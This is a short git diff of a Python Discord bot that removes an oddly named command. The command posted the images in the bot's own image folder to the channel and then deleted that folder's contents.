@@ -51,29 +51,5 @@ async def cable(ctx):
                 shutil.rmtree(file_path)
         except Exception as e:
             print('Failed to delete %s. Reason: %s' % (file_path, e))
-
-@client.command()
-async def absdfhjsdavhkfjvsdakhjfv(ctx):
-
-    folder = 'main/bot/images'
-
-    for file in os.listdir('main/bot/images'):
-        f = os.path.join('main/bot/images', file)
-
-        if os.path.isfile(f):
-            # Sends images to discord
-            #print(r'main/bot/images' + file)
-            await ctx.send(file=discord.File(r'main/bot/images/' + file))
-
-    for filename in os.listdir(folder):
-        file_path = os.path.join(folder, filename)
-        try:
-            if os.path.isfile(file_path) or os.path.islink(file_path):
-             os.unlink(file_path)
-            elif os.path.isdir(file_path):
-                shutil.rmtree(file_path)
-        except Exception as e:
-            print('Failed to delete %s. Reason: %s' % (file_path, e))
-
         
 client.run(TOKEN)
